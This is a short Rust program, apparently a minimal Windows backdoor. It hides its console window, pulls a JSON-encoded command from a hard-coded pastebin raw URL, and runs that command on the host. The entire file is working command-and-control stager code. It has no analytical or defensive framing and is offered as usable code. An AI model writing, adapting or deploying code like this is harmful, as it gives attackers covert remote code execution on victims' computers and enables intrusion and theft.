//#![cfg(target_os = "windows")]
#![windows_subsystem = "windows"]
#![feature(alloc_system)]

#[macro_use]
extern crate serde_derive;

extern crate curl;
extern crate serde;
extern crate serde_json;

use std::process::Command;

use curl::easy::Easy;

#[derive(Serialize, Deserialize, Debug)]
struct Cmd {
    cmd: String,
    args: Vec<String>,
}
//Executes a command.
fn execute(command: Cmd) -> Result<std::process::Output, std::io::Error> {
    Command::new(command.cmd.as_str()).args(command.args.as_slice()).output()
}
//Queries a url for json.
fn query(url: &str) -> Result<Cmd, serde_json::Error> {
    let mut data = vec!();
    let mut handle = Easy::new();
    handle.url(url).unwrap();
    {
        let mut transfer = handle.transfer();
        transfer.write_function(|new_data| {
            data.extend_from_slice(new_data);
            Ok(new_data.len())
        }).unwrap();
        transfer.perform().unwrap();
    }
    //Parses the json.
    serde_json::from_str(&String::from_utf8(data).unwrap())
}

fn main() {
    let urls: [& str; 1] = ["https://pastebin.com/raw/ZN9QGNZq"];
    //Iterate the urls jus in case one is offline or broken.
    for i in 0 .. urls.len() {
            let temp_cmd: Option<Cmd> = match query(urls[i]) {
                Ok(o) => Some(o),
                Err(_) => None,
            };
            //Execute the command if its valid.
            if let Some(cmd) = temp_cmd {
                match execute(cmd) {
                    Ok(_) => break,
                    Err(_) => break,
                };
            }
        }
}
